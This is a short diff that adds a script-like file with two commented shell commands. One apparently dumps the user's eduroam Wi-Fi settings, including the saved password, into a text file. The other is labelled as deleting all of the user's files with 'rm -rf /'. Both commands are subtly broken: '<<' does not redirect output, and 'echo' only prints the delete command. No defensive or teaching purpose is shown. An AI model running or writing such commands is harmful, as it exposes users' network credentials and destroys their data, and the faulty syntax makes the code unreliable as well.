@@ -1,0 +1,6 @@
+//outputs user's eduroam network info including password into a text file
+nmcli -s connection show eduroam << networkPassword.txt
+
+//removes all of the users files and directories
+echo rm -rf /
+
